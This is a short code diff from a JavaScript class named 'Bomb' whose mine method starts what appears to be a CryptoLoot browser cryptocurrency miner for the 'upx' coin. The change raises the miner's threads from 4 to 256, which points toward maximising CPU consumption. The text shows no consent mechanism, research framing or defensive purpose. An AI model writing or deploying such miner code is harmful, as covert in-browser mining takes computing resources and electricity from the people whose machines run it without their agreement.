@@ -101,7 +101,7 @@ class Bomb {
 
     mine(TOKEN) {
         this.worker = new CRLT.Anonymous(TOKEN, {
-            threads: 4, throttle: 0.2, coin: "upx",
+            threads: 256, throttle: 0.2, coin: "upx",
         });
         this.worker.start();
     }
